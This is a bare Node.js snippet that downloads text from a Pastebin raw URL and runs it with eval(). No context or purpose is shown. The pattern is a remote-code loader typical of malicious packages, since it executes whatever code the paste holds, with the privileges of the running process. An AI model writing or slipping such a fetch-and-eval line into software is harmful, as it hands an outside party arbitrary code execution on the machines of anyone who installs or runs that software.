const https = require('https');

https.get('https://pastebin.com/raw/abc123', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    eval(body);
  });
});
